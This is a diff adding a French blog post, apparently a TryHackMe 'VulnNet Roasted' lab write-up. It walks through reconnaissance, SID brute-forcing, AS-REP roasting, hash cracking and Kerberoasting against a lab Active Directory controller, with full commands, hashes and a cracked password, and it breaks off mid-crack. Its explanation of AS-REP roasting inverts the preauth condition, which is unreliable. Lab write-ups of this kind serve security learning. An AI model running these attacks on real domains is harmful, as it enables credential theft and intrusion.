@@ -1,0 +1,959 @@
+<!doctype html>
+<html lang="fr-fr" class="no-js">
+
+  <head>
+    <link href="http://gmpg.org/xfn/11" rel="profile" hreflang="fr">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  
+    <meta name="google-site-verification" content="JeRPv2CEcpONAy8C7dMr1nzjlpZxlxYCtt2PnuQ78g8" />
+    <!-- Enable responsiveness on mobile devices-->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+  
+    <title>
+      
+        VulnNet Roasted - Lukas
+      
+    </title>
+
+	<link rel="stylesheet" href="/assets/css/style.css?v=1.13"> <!-- Resource style -->
+    <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Signika:600"> <!-- Logo font -->
+    <script src="/assets/js/modernizr.js"></script> <!-- Modernizr -->
+    
+    <link rel="apple-touch-icon" sizes="57x57" href="/assets/icones/favicon/apple-icon-57x57.png">
+    <link rel="apple-touch-icon" sizes="60x60" href="/assets/icones/favicon/apple-icon-60x60.png">
+    <link rel="apple-touch-icon" sizes="72x72" href="/assets/icones/favicon/apple-icon-72x72.png">
+    <link rel="apple-touch-icon" sizes="76x76" href="/assets/icones/favicon/apple-icon-76x76.png">
+    <link rel="apple-touch-icon" sizes="114x114" href="/assets/icones/favicon/apple-icon-114x114.png">
+    <link rel="apple-touch-icon" sizes="120x120" href="/assets/icones/favicon/apple-icon-120x120.png">
+    <link rel="apple-touch-icon" sizes="144x144" href="/assets/icones/favicon/apple-icon-144x144.png">
+    <link rel="apple-touch-icon" sizes="152x152" href="/assets/icones/favicon/apple-icon-152x152.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="/assets/icones/favicon/apple-icon-180x180.png">
+    <link rel="icon" type="image/png" sizes="192x192"  href="/assets/icones/favicon/android-icon-192x192.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/assets/icones/favicon/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="96x96" href="/assets/icones/favicon/favicon-96x96.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/assets/icones/favicon/favicon-16x16.png">
+    
+    <meta name="msapplication-TileColor" content="#ffffff">
+    <meta name="msapplication-TileImage" content="/assets/icones/favicon/ms-icon-144x144.png">
+    <meta name="theme-color" content="#ffffff">
+  	
+	<!-- RSS -->
+    <link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Lukas" />
+
+    <!-- Twitter card -->
+    <meta name="twitter:card" content="summary" />
+    <meta name="twitter:site" content="@lukastaboga" />
+    <meta name="twitter:creator" content="@lukastaboga" />
+    <meta name="twitter:title" content="VulnNet Roasted" />
+    <meta name="twitter:description" content="Analyse approfondie de la vulnérabilité VulnNet Roasted dans Active Directory." />
+    
+    <meta name="twitter:image" content="http://localhost:4000/assets/uploads/2024/2024-thm-Roasted/img.png" />
+    
+
+    
+      
+    
+	<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-DNP6NC70FV"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-DNP6NC70FV');
+</script>
+    <!-- Begin Jekyll SEO tag v2.8.0 -->
+<meta name="generator" content="Jekyll v4.3.3" />
+<meta property="og:title" content="VulnNet Roasted" />
+<meta name="author" content="Lukas" />
+<meta property="og:locale" content="fr_FR" />
+<meta name="description" content="Analyse approfondie de la vulnérabilité VulnNet Roasted dans Active Directory." />
+<meta property="og:description" content="Analyse approfondie de la vulnérabilité VulnNet Roasted dans Active Directory." />
+<link rel="canonical" href="http://localhost:4000/vulnnet-roasted/" />
+<meta property="og:url" content="http://localhost:4000/vulnnet-roasted/" />
+<meta property="og:site_name" content="Lukas" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-03-26T01:00:00+01:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="VulnNet Roasted" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Lukas"},"dateModified":"2024-03-26T01:00:00+01:00","datePublished":"2024-03-26T01:00:00+01:00","description":"Analyse approfondie de la vulnérabilité VulnNet Roasted dans Active Directory.","headline":"VulnNet Roasted","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/vulnnet-roasted/"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/icones/avatar.png"},"name":"Lukas"},"url":"http://localhost:4000/vulnnet-roasted/"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+
+
+  <body>
+    <header class="cd-main-header">
+    <a href="/" class="cd-logo"><img src="/assets/icones/logo.png" alt="hackndo logo" /> <span class="cd-logo-title">hello</span></a>
+		
+    <a href="#0" class="cd-nav-trigger">Menu<span></span></a>
+
+</header> <!-- .cd-main-header -->
+    <main class="cd-main-content">
+		<nav class="cd-side-nav">
+            <div class="sidebar-about">
+    <h1>
+        <img id="site-logo" src="/assets/icones/avatar.png" alt="hackndo logo" title="logo" />
+        <a class="sidebar-title" href="/">
+        Lukas
+        </a>
+    </h1>
+    <p class="lead">out of the box</p>
+</div>
+
+<ul>
+    <li class="cd-label">Blog</li>
+    <li class="">
+        <a href="/">Home</a>
+    </li>
+    
+    
+        
+            
+        
+    
+        
+            
+                <li class="">
+                    <a href="/about/">À propos</a>
+                </li>
+            
+        
+    
+        
+            
+                <li class="">
+                    <a href="/archives/">Archives</a>
+                </li>
+            
+        
+    
+        
+            
+                <li class="">
+                    <a href="/contact/">Me contacter</a>
+                </li>
+            
+        
+    
+        
+            
+                <li class="">
+                    <a href="/disclaimer/">Disclaimer</a>
+                </li>
+            
+        
+    
+        
+    
+        
+            
+        
+    
+        
+            
+                <li class="">
+                    <a href="/projects/">Projets</a>
+                </li>
+            
+        
+    
+        
+    
+        
+            
+                <li class="">
+                    <a href="/trophies/">Trophées/Certifications</a>
+                </li>
+            
+        
+    
+        
+    
+</ul>
+<div class="sidebar-social">
+<ul>
+  <li><a href="https://x.com/lukastaboga" title="Twitter" target="_blank"><img alt="Twitter" title="Twitter" src="/assets/icones/social/twitter.png" /></a></li>
+  <li><a href="https://github.com/ticodevv" title="Github" target="_blank"><img title="Github" alt="Github" src="/assets/icones/social/github.png" /></a></li>
+  <li><a href="https://www.linkedin.com/in/lukas-taboga-5a8040237/" title="LinkedIn" target="_blank"><img title="LinkedIn" alt="LinkedIn" src="/assets/icones/social/linkedin.png" /></a></li>
+</ul>
+</div>
+<p class="sidebar-copyright">&copy; 2024. Tous droits réservés.</p>
+
+        </nav>
+
+        <div class="content-wrapper">
+            
+              
+                
+              
+                
+              
+                
+              
+                
+                  
+                
+              
+                
+              
+                
+              
+                
+              
+                
+              
+            
+            <div class="post">
+  
+  <div class="post-cover">
+    <img src="/assets/uploads/2024/2024-thm-Roasted/img.png" alt="VulnNet Roasted" title="VulnNet Roasted" />
+  </div>
+  
+  <h1 class="post-title">VulnNet Roasted</h1>
+  <div class="post-info">
+    
+    <p class="alignleft">26 Mar 2024 · 21 min</p>
+    <p class="alignright">Auteur : <strong><a href="https://twitter.com/HackAndDo">Lukas</a></strong></p>
+      <div class="keywords">
+        <span class="post-tags"><a href="/archives/#active-directory"><i class="fas fa-tags"></i> Active Directory</a><a href="/archives/#kerberos"><i class="fas fa-tags"></i> Kerberos</a><a href="/archives/#as-rep-roasting"><i class="fas fa-tags"></i> AS-REP Roasting</a></span>
+      </div>
+</div>
+
+  <article>
+  <p><img src="img.png" alt="VulnNet Roasted" /></p>
+
+<p><strong>VulnNet Entertainment</strong> a rapidement déployé une nouvelle instance de gestion sur leur réseau très étendu…</p>
+
+<p>VulnNet Entertainment vient de déployer une nouvelle instance sur leur réseau avec les administrateurs systèmes récemment embauchés. En tant qu’entreprise soucieuse de la sécurité, ils vous ont, comme toujours, engagé pour réaliser un test de pénétration et voir comment les administrateurs systèmes se débrouillent.
+<!--more--></p>
+
+<h2 id="vulnnet-roasted">VulnNet Roasted</h2>
+<h3 id="reconnaissance">Reconnaissance</h3>
+<h4 id="nmap">Nmap</h4>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>May 12, 2024 - 11:38:12 <span class="o">(</span>UTC<span class="o">)]</span> exegol-thm VulnNet: Roasted <span class="c"># nmap -A 10.10.211.33</span>
+Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-05-12 11:38 UTC
+Nmap scan report <span class="k">for </span>10.10.211.33
+Host is up <span class="o">(</span>0.096s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 990 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
+PORT     STATE    SERVICE          VERSION
+88/tcp   filtered kerberos-sec
+135/tcp  filtered msrpc
+139/tcp  filtered netbios-ssn
+389/tcp  filtered ldap
+464/tcp  filtered kpasswd5
+593/tcp  filtered http-rpc-epmap
+636/tcp  filtered ldapssl
+3268/tcp filtered globalcatLDAP
+3269/tcp filtered globalcatLDAPssl
+3389/tcp filtered ms-wbt-server
+Too many fingerprints match this host to give specific OS details
+Network Distance: 2 hops
+
+TRACEROUTE <span class="o">(</span>using port 80/tcp<span class="o">)</span>
+HOP RTT      ADDRESS
+1   62.48 ms 10.8.0.1
+2   79.22 ms 10.10.211.33
+</code></pre></div></div>
+
+<h4 id="ports-ouverts">Ports ouverts:</h4>
+<ul>
+  <li><strong>88/tcp:</strong> Kerberos</li>
+  <li><strong>135/tcp:</strong> MSRPC (Microsoft Windows RPC)</li>
+  <li><strong>139/tcp:</strong> NetBIOS (Microsoft Windows netbios-ssn)</li>
+  <li><strong>389/tcp:</strong> LDAP (Lightweight Directory Access Protocol)</li>
+  <li><strong>464/tcp:</strong> Kpasswd5</li>
+  <li><strong>593/tcp:</strong> HTTP-RPC-EPMAP</li>
+  <li><strong>636/tcp:</strong> LDAPSSL</li>
+  <li><strong>3268/tcp:</strong> GlobalcatLDAP</li>
+  <li><strong>3269/tcp:</strong> GlobalcatLDAPssl</li>
+  <li><strong>3389/tcp:</strong> MS-WBT-SERVER (Microsoft Windows Remote Desktop)</li>
+</ul>
+
+<h4 id="enum4linux">enum4linux</h4>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>May 12, 2024 - 11:41:25 <span class="o">(</span>UTC<span class="o">)]</span> exegol-thm VulnNet: Roasted <span class="c"># enum4linux-ng -A 10.10.211.33</span>
+ENUM4LINUX - next generation <span class="o">(</span>v1.3.3<span class="o">)</span>
+
+ <span class="o">==========================</span>
+|    Target Information    |
+ <span class="o">==========================</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Target ........... 10.10.211.33
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Username ......... <span class="s1">''</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Random Username .. <span class="s1">'qadhxoqj'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Password ......... <span class="s1">''</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Timeout .......... 5 second<span class="o">(</span>s<span class="o">)</span>
+
+ <span class="o">=====================================</span>
+|    Listener Scan on 10.10.211.33    |
+ <span class="o">=====================================</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Checking LDAP
+<span class="o">[</span>+] LDAP is accessible on 389/tcp
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Checking LDAPS
+<span class="o">[</span>+] LDAPS is accessible on 636/tcp
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Checking SMB
+<span class="o">[</span>+] SMB is accessible on 445/tcp
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Checking SMB over NetBIOS
+<span class="o">[</span>+] SMB over NetBIOS is accessible on 139/tcp
+
+ <span class="o">====================================================</span>
+|    Domain Information via LDAP <span class="k">for </span>10.10.211.33    |
+ <span class="o">====================================================</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Trying LDAP
+<span class="o">[</span>+] Appears to be root/parent DC
+<span class="o">[</span>+] Long domain name is: vulnnet-rst.local
+
+ <span class="o">===========================================================</span>
+|    NetBIOS Names and Workgroup/Domain <span class="k">for </span>10.10.211.33    |
+ <span class="o">===========================================================</span>
+<span class="o">[</span>-] Could not get NetBIOS names information via <span class="s1">'nmblookup'</span>: timed out
+
+ <span class="o">=========================================</span>
+|    SMB Dialect Check on 10.10.211.33    |
+ <span class="o">=========================================</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Trying on 445/tcp
+<span class="o">[</span>+] Supported dialects and settings:
+Supported dialects:
+  SMB 1.0: <span class="nb">false
+  </span>SMB 2.02: <span class="nb">true
+  </span>SMB 2.1: <span class="nb">true
+  </span>SMB 3.0: <span class="nb">true
+  </span>SMB 3.1.1: <span class="nb">true
+</span>Preferred dialect: SMB 3.0
+SMB1 only: <span class="nb">false
+</span>SMB signing required: <span class="nb">true</span>
+
+ <span class="o">===========================================================</span>
+|    Domain Information via SMB session <span class="k">for </span>10.10.211.33    |
+ <span class="o">===========================================================</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Enumerating via unauthenticated SMB session on 445/tcp
+<span class="o">[</span>+] Found domain information via SMB
+NetBIOS computer name: WIN-2BO8M1OE1M1
+NetBIOS domain name: VULNNET-RST
+DNS domain: vulnnet-rst.local
+FQDN: WIN-2BO8M1OE1M1.vulnnet-rst.local
+Derived membership: domain member
+Derived domain: VULNNET-RST
+
+ <span class="o">=========================================</span>
+|    RPC Session Check on 10.10.211.33    |
+ <span class="o">=========================================</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Check <span class="k">for </span>null session
+<span class="o">[</span>-] Could not establish null session: timed out
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Check <span class="k">for </span>random user
+<span class="o">[</span>-] Could not establish random user session: timed out
+<span class="o">[</span>-] Sessions failed, neither null nor user sessions were possible
+
+ <span class="o">===============================================</span>
+|    OS Information via RPC <span class="k">for </span>10.10.211.33    |
+ <span class="o">===============================================</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Enumerating via unauthenticated SMB session on 445/tcp
+<span class="o">[</span>+] Found OS information via SMB
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Enumerating via <span class="s1">'srvinfo'</span>
+<span class="o">[</span>-] Skipping <span class="s1">'srvinfo'</span> run, not possible with provided credentials
+<span class="o">[</span>+] After merging OS information we have the following result:
+OS: Windows 10, Windows Server 2019, Windows Server 2016
+OS version: <span class="s1">'10.0'</span>
+OS release: <span class="s1">'1809'</span>
+OS build: <span class="s1">'17763'</span>
+Native OS: not supported
+Native LAN manager: not supported
+Platform <span class="nb">id</span>: null
+Server <span class="nb">type</span>: null
+Server <span class="nb">type </span>string: null
+
+<span class="o">[!]</span> Aborting remainder of tests since sessions failed, rerun with valid credentials
+
+Completed after 60.57 seconds
+</code></pre></div></div>
+
+<p>Les informations obtenues sont les suivantes:</p>
+<ul>
+  <li><strong>Nom de l’ordinateur NetBIOS:</strong> WIN-2BO8M1OE1M1</li>
+  <li><strong>Nom de domaine NetBIOS:</strong> VULNNET-RST</li>
+  <li><strong>Domaine DNS:</strong> vulnnet-rst.local</li>
+  <li><strong>FQDN:</strong> WIN-2BO8M1OE1M1.vulnnet-rst.local</li>
+  <li><strong>OS:</strong> Windows 10, Windows Server 2019, Windows Server 2016</li>
+  <li><strong>Version de l’OS:</strong> 10.0</li>
+</ul>
+
+<p>Une fois ça fais on peux regarder les SID du domaine avec <code class="language-plaintext highlighter-rouge">rpcclient</code>:</p>
+
+<p>C’set quoi un SID ?
+Le SID (Security Identifier) est un identifiant unique attribué à chaque compte utilisateur, groupe ou ordinateur dans un domaine Active Directory. Il est utilisé pour identifier de manière unique un objet ou une entité dans un domaine Active Directory.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>May 12, 2024 - 11:47:35 <span class="o">(</span>UTC<span class="o">)]</span> exegol-thm VulnNet: Roasted <span class="c"># lookupsid.py guest@10.10.211.33</span>
+Impacket <span class="k">for </span>Exegol - v0.10.1.dev1+20240403.124027.3e5f85b - Copyright 2022 Fortra - forked by ThePorgs
+
+Password:
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Brute forcing SIDs at 10.10.211.33
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> StringBinding ncacn_np:10.10.211.33[<span class="se">\p</span>ipe<span class="se">\l</span>sarpc]
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Domain SID is: S-1-5-21-1589833671-435344116-4136949213
+498: VULNNET-RST<span class="se">\E</span>nterprise Read-only Domain Controllers <span class="o">(</span>SidTypeGroup<span class="o">)</span>
+500: VULNNET-RST<span class="se">\A</span>dministrator <span class="o">(</span>SidTypeUser<span class="o">)</span>
+501: VULNNET-RST<span class="se">\G</span>uest <span class="o">(</span>SidTypeUser<span class="o">)</span>
+502: VULNNET-RST<span class="se">\k</span>rbtgt <span class="o">(</span>SidTypeUser<span class="o">)</span>
+512: VULNNET-RST<span class="se">\D</span>omain Admins <span class="o">(</span>SidTypeGroup<span class="o">)</span>
+513: VULNNET-RST<span class="se">\D</span>omain Users <span class="o">(</span>SidTypeGroup<span class="o">)</span>
+514: VULNNET-RST<span class="se">\D</span>omain Guests <span class="o">(</span>SidTypeGroup<span class="o">)</span>
+515: VULNNET-RST<span class="se">\D</span>omain Computers <span class="o">(</span>SidTypeGroup<span class="o">)</span>
+516: VULNNET-RST<span class="se">\D</span>omain Controllers <span class="o">(</span>SidTypeGroup<span class="o">)</span>
+517: VULNNET-RST<span class="se">\C</span>ert Publishers <span class="o">(</span>SidTypeAlias<span class="o">)</span>
+518: VULNNET-RST<span class="se">\S</span>chema Admins <span class="o">(</span>SidTypeGroup<span class="o">)</span>
+519: VULNNET-RST<span class="se">\E</span>nterprise Admins <span class="o">(</span>SidTypeGroup<span class="o">)</span>
+520: VULNNET-RST<span class="se">\G</span>roup Policy Creator Owners <span class="o">(</span>SidTypeGroup<span class="o">)</span>
+521: VULNNET-RST<span class="se">\R</span>ead-only Domain Controllers <span class="o">(</span>SidTypeGroup<span class="o">)</span>
+522: VULNNET-RST<span class="se">\C</span>loneable Domain Controllers <span class="o">(</span>SidTypeGroup<span class="o">)</span>
+525: VULNNET-RST<span class="se">\P</span>rotected Users <span class="o">(</span>SidTypeGroup<span class="o">)</span>
+526: VULNNET-RST<span class="se">\K</span>ey Admins <span class="o">(</span>SidTypeGroup<span class="o">)</span>
+527: VULNNET-RST<span class="se">\E</span>nterprise Key Admins <span class="o">(</span>SidTypeGroup<span class="o">)</span>
+553: VULNNET-RST<span class="se">\R</span>AS and IAS Servers <span class="o">(</span>SidTypeAlias<span class="o">)</span>
+571: VULNNET-RST<span class="se">\A</span>llowed RODC Password Replication Group <span class="o">(</span>SidTypeAlias<span class="o">)</span>
+572: VULNNET-RST<span class="se">\D</span>enied RODC Password Replication Group <span class="o">(</span>SidTypeAlias<span class="o">)</span>
+1000: VULNNET-RST<span class="se">\W</span>IN-2BO8M1OE1M1<span class="nv">$ </span><span class="o">(</span>SidTypeUser<span class="o">)</span>
+1101: VULNNET-RST<span class="se">\D</span>nsAdmins <span class="o">(</span>SidTypeAlias<span class="o">)</span>
+1102: VULNNET-RST<span class="se">\D</span>nsUpdateProxy <span class="o">(</span>SidTypeGroup<span class="o">)</span>
+1104: VULNNET-RST<span class="se">\e</span>nterprise-core-vn <span class="o">(</span>SidTypeUser<span class="o">)</span>
+1105: VULNNET-RST<span class="se">\a</span><span class="nt">-whitehat</span> <span class="o">(</span>SidTypeUser<span class="o">)</span>
+1109: VULNNET-RST<span class="se">\t</span><span class="nt">-skid</span> <span class="o">(</span>SidTypeUser<span class="o">)</span>
+1110: VULNNET-RST<span class="se">\j</span><span class="nt">-goldenhand</span> <span class="o">(</span>SidTypeUser<span class="o">)</span>
+1111: VULNNET-RST<span class="se">\j</span><span class="nt">-leet</span> <span class="o">(</span>SidTypeUser<span class="o">)</span>
+</code></pre></div></div>
+
+<p>BINGO ! On a des utilisateurs:</p>
+<ul>
+  <li><strong>a-whitehat</strong></li>
+  <li><strong>enterprise-core-vn</strong></li>
+  <li><strong>j-goldenhand</strong></li>
+  <li><strong>j-leet</strong></li>
+  <li><strong>t-skid</strong></li>
+</ul>
+
+<h3 id="exploitation">Exploitation</h3>
+
+<h4 id="as-rep-roasting">As-Rep Roasting</h4>
+
+<p>C’est quoi l’As-Rep Roasting ?</p>
+
+<p>L’attaque AS-REP Roasting est une attaque contre les comptes Active Directory qui n’ont pas l’attribut UF_DONT_REQUIRE_PREAUTH défini. L’attaque consiste à envoyer une demande de ticket Kerberos pour un utilisateur qui n’a pas l’attribut UF_DONT_REQUIRE_PREAUTH défini. L’attaque est appelée “roasting” car l’attaquant peut récupérer le hash du mot de passe de l’utilisateur sans avoir besoin de déchiffrer le trafic réseau.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>May 12, 2024 - 11:52:48 <span class="o">(</span>UTC<span class="o">)]</span> exegol-thm VulnNet: Roasted <span class="c"># GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -usersfile users.txt -dc-ip "10.10.211.33" "vulnnet-rst.local"/</span>
+Impacket <span class="k">for </span>Exegol - v0.10.1.dev1+20240403.124027.3e5f85b - Copyright 2022 Fortra - forked by ThePorgs
+
+<span class="o">[</span>-] User a-whitehat doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User enterprise-core-vn doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User j-goldenhand doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User j-leet doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="nv">$krb5asrep$23$t</span><span class="nt">-skid</span>@VULNNET-RST.LOCAL:02349b9312c22cce838b122bbb4e6576<span class="nv">$247f0fe80f8d9c3ced75694bf421006a815c89b6f98382b865582e42d4e4c248b36130f42f68de4c914c908c8c9adef2dc8173e8090d25b7bfec3bec292f64dd1ed1514415075d07399f13c3ca287be9c99e6b2a668fbfda658621cdb6ec13a81334e7acd95d261335b1f8454b1e8ab7f57996810fd98dbb65feeb0f706bf9652c8e304098ba05dc2fcb750b19487a66ea3689f67b1196efa17da808124ad220c623c2eb0f77d54e9304f3fb3346099e5f9e7d8fed0f3c5247d20d258dc25c8eb4455a6513b01399cfd6e7f24f332a9438b26fc6222977738773fcfeff4c63566f850dca6fc6cc72fd1df73d9e835d5218d63d615e19</span>
+</code></pre></div></div>
+
+<p>On a récupéré le hash du mot de passe de l’utilisateur <strong>t-skid</strong>.</p>
+
+<h4 id="cracking">Cracking</h4>
+
+<p>On peut maintenant cracker le hash récupéré avec John The Ripper:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>May 12, 2024 - 11:54:10 <span class="o">(</span>UTC<span class="o">)]</span> exegol-thm VulnNet: Roasted <span class="c"># john --wordlist=`fzf-wordlists` ASREProastables.txt</span>
+Using default input encoding: UTF-8
+Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>krb5asrep, Kerberos 5 AS-REP etype 17/18/23 <span class="o">[</span>MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 ASIMD 4x]<span class="o">)</span>
+Cost 1 <span class="o">(</span>etype<span class="o">)</span> is 23 <span class="k">for </span>all loaded hashes
+Will run 8 OpenMP threads
+Press <span class="s1">'q'</span> or Ctrl-C to abort, <span class="s1">'h'</span> <span class="k">for </span><span class="nb">help</span>, almost any other key <span class="k">for </span>status
+tj072889<span class="k">*</span>        <span class="o">(</span><span class="nv">$krb5asrep$23$t</span><span class="nt">-skid</span>@VULNNET-RST.LOCAL<span class="o">)</span>
+1g 0:00:00:01 DONE <span class="o">(</span>2024-05-12 11:54<span class="o">)</span> 0.6803g/s 2184Kp/s 2184Kc/s 2184KC/s tomaatjuh..tigris@livs
+Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
+Session completed.
+</code></pre></div></div>
+
+<p>Le mot de passe de l’utilisateur <strong>t-skid</strong> est <strong>tj072889</strong>.</p>
+
+<h4 id="kerberoasting">Kerberoasting</h4>
+
+<p>C’est quoi le Kerberoasting ?</p>
+
+<p>L’attaque Kerberoasting est une attaque contre les comptes Active Directory qui ont l’attribut servicePrincipalName défini. L’attaque consiste à envoyer une demande de ticket Kerberos pour un utilisateur qui a l’attribut servicePrincipalName défini. L’attaque est appelée “roasting” car l’attaquant peut récupérer le hash du mot de passe de l’utilisateur sans avoir besoin de déchiffrer le trafic réseau.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>May 12, 2024 - 12:03:25 <span class="o">(</span>UTC<span class="o">)]</span> exegol-thm VulnNet: Roasted <span class="c"># GetUserSPNs.py 'VULNNET-RST.local/t-skid:tj072889*' -outputfile hashes -dc-ip 10.10.211.33</span>
+Impacket <span class="k">for </span>Exegol - v0.10.1.dev1+20240403.124027.3e5f85b - Copyright 2022 Fortra - forked by ThePorgs
+
+ServicePrincipalName    Name                MemberOf                                                       PasswordLastSet             LastLogon                   Delegation
+<span class="nt">----------------------</span>  <span class="nt">------------------</span>  <span class="nt">-------------------------------------------------------------</span>  <span class="nt">--------------------------</span>  <span class="nt">--------------------------</span>  <span class="nt">----------</span>
+CIFS/vulnnet-rst.local  enterprise-core-vn  <span class="nv">CN</span><span class="o">=</span>Remote Management Users,CN<span class="o">=</span>Builtin,DC<span class="o">=</span>vulnnet-rst,DC<span class="o">=</span><span class="nb">local  </span>2021-03-11 19:45:09.913979  2021-03-13 23:41:17.987528
+
+
+
+<span class="o">[</span>-] CCache file is not found. Skipping...
+</code></pre></div></div>
+
+<p>On a récupéré le hash du mot de passe de l’utilisateur <strong>enterprise-core-vn</strong>.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>May 12, 2024 - 12:03:42 <span class="o">(</span>UTC<span class="o">)]</span> exegol-thm VulnNet: Roasted <span class="c"># cat hashes</span>
+<span class="nv">$krb5tgs$23$*</span>enterprise-core-vn<span class="nv">$VULNNET</span><span class="nt">-RST</span>.LOCAL<span class="nv">$VULNNET</span><span class="nt">-RST</span>.local/enterprise-core-vn<span class="k">*</span><span class="nv">$964e72ce6bca5255ff16822ec093621b$f4205c6f1560b7ccf8e41ea21919930a479b710eba5871ea2c2cae415115692801ce950513bfd01c8042faa4cdbe9cf01abfd13d8d593b6cf0125697dc69a482595497675584e7056b02ae92b49fe416a490103307191c092784c56c72ca18dedd843cd1568f085eaef37e4d107b346c6d4d03c9fc1e7c9b5c03f50d757a34d94f370b51fc841e61737520afd60eb4c2f94fde83c3e3773b1a4620051521c3045ea80c76181e2feb164c52bc6b8e8b5c20beb6cca6d7c12db081bf451c78f29ec884489ba4b58173877db82e862d1a1d2bf26f158f0d9c33badd596f181f37314beffefa60bd29f4da41aac80ff56f3eae5de78036f94aa552d91974c106c8609bc80cc81d5794172cd3bc56bb4da847d13cd320dd93343cb4743ab9f0907e79dea28fe5de0d9fb4fc0ea89dc514dd0b6d19915714b5b4d44cefaf859dd0afdcc1b6b11a666ecdc0a84c35d8116821570921f5ce236bba8225d77c52c0c06fab5c0dc5437cea9094af4cc37a550ecfdc4cb022589396f4cfdc7d3b559646b14a379df69656cd11213a155d95f47a220715c11061a3af33b81dfa836a3a7553874a5a936bea2dc9a284bcf2fcb5c582877dc9976d5d2d29ebbf84ea8853dc413512eb7d1dcf47b68b6ad17705b0b732c449ca9c4bb8801b63e90c825da161c0365211b4d4f54a6126b838f362c9b3d9ee234bb794021e6bf9645ff3ca0768885586d966d10ad540cffe06d18e617990a9b9f63c20c252cae2af2570e9a369d14debbcda58b768d274be8d3710c3fc8d497bfca1553fedf2017cfbf4808ac80a8a1b49961131af64dcb21ab0dfeb1b89b331b17e0349984a875039baf81cc1cc8e4d015c503ccc7065851b073ff1191413b763162bcca1588d1fca4db8830542eed9b561d376194183d078035ce74125b10c85841043cff5c2302965e55004810ca63d11260bab81ddc0456be7b2278b655dfd59683893dccdfc024c9cc0acb819dcf9f0cbafa29e8b22213a243451cfe902bf4051bd862ea80620c002502c9744dd143b11336782d9a2b815b17245faca22653b03c6367a9a36b22b312ba51e5e7bf1ef780a88d9e4c9f8bdf3ac58251c0199ff1dab58db3512c68a3ee3487f8142290f9ae2a9fc8d24faeadf204a8059f65288e929f78f09a57e8af2b2f2e0f13d222c339c58a23a5bbbca580a88d80c9055e2b39d7263e67ee16754fa788b3cca777354ccace352a664f45949aebf8492eb5996e765bbb266f418921e06a37bbcd234d2263999f9e029195bfe73421c1834f608d6f0efae2924478a8648a4c2d9af8481274e60f824c9ed022c501bf4e907c2318f88cf6119c8e15c205f51e283556aae05b2078411102b01e7d05fb09934d3c394846fcb03ceb730f4</span>
+</code></pre></div></div>
+
+<h4 id="cracking-1">Cracking</h4>
+
+<p>On peut maintenant cracker le hash récupéré avec John The Ripper:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>May 12, 2024 - 12:03:49 <span class="o">(</span>UTC<span class="o">)]</span> exegol-thm VulnNet: Roasted <span class="c"># john --wordlist=`fzf-wordlists` hashes</span>
+Using default input encoding: UTF-8
